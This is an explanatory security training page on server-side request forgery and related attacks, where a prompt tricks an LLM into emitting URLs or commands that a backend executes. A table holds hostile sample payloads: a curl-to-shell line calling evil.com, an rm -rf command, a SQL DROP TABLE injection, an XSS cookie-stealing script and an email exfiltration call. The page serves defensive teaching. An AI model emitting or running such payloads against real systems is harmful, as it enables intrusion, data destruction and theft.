# 📖 Concept — SSRF via LLM Output Exploitation

## What Is This Vulnerability?

When an application **acts on LLM output** without validation, the LLM
becomes a proxy that attackers can manipulate to perform unauthorized
server-side actions.

**SSRF (Server-Side Request Forgery):** The server makes HTTP requests
to attacker-controlled destinations — including internal services that
should never be accessible from the outside.

**LLM Output Exploitation:** The broader category where any LLM output
that triggers backend actions can be weaponized.

## The Attack Model

```
Traditional SSRF:
  Attacker → [Crafted URL parameter] → Server → Internal Service

LLM-mediated SSRF:
  Attacker → [Crafted prompt] → LLM → [Generates URL] → Server → Internal Service
```

The critical difference: traditional SSRF requires the attacker to find
a parameter that the server fetches. LLM-mediated SSRF only requires
tricking the LLM into outputting text that the server interprets as a URL.

## Why LLMs Make SSRF Worse

| Traditional SSRF | LLM-Mediated SSRF |
|---|---|
| Fixed parameter names to exploit | Natural language — infinite ways to phrase |
| WAF rules can block known patterns | LLM output is unpredictable, hard to filter |
| Input validation works | LLM may generate internal URLs on its own |
| Attacker needs to know internal URLs | LLM may KNOW internal URLs from its prompt |

## The Trust Chain Problem

```
┌─────────────────────────────────────────────────────┐
│           Application Trust Assumptions              │
│                                                      │
│  "LLM output is safe"  ← WRONG                      │
│  "LLM follows rules"   ← SOMETIMES                  │
│  "LLM won't output internal URLs" ← UNPROVABLE      │
└─────────────────────────────────────────────────────┘
         ↓
┌─────────────────────────────────────────────────────┐
│            Dangerous Backend Patterns                 │
│                                                      │
│  • Fetching URLs from LLM output                     │
│  • Executing code/commands from LLM output           │
│  • Making API calls based on LLM decisions           │
│  • Storing LLM output directly in databases          │
│  • Using LLM output in SQL/shell/template strings    │
└─────────────────────────────────────────────────────┘
```

## Beyond SSRF: Other Output Exploitation Vectors

| Vector | LLM Output | Backend Action | Impact |
|---|---|---|---|
| SSRF | `[FETCH: http://internal/...]` | HTTP request | Access internal services |
| Code exec | `os.system("rm -rf /")` | eval/exec | Full server compromise |
| SQL injection | `'; DROP TABLE users; --` | Database query | Data destruction |
| Command injection | `; curl evil.com/shell.sh \| sh` | Shell execution | RCE |
| XSS | `<script>steal(cookies)</script>` | HTML rendering | Client compromise |
| Email exfil | `send_email(secrets, attacker)` | Email API | Data theft |

## The Fundamental Principle

> **Never trust LLM output as safe input for any backend operation.**
>
> Treat LLM output with the same suspicion as user input — because
> the user controls the LLM's output through prompt manipulation.
